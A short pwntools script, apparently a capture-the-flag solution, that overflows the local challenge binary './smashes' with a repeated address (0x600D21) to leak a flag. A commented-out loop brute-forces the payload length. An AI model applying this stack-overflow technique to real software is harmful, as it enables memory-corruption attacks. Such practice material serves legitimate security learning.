#!/usr/bin/env python

from pwn import *


Io = process("./smashes")
payload = p64(0x0600D21) * 16
print "[Length] : %d" % (len(payload))
Io.send(payload)
Io.interactive()

#for i in range(128):
#    Io = process("./smashes")
#    payload = p64(0x0600D21) * i
#    print "[Length] : %d" % (len(payload))
##    Io.send(payload)
#    Io.interactive()
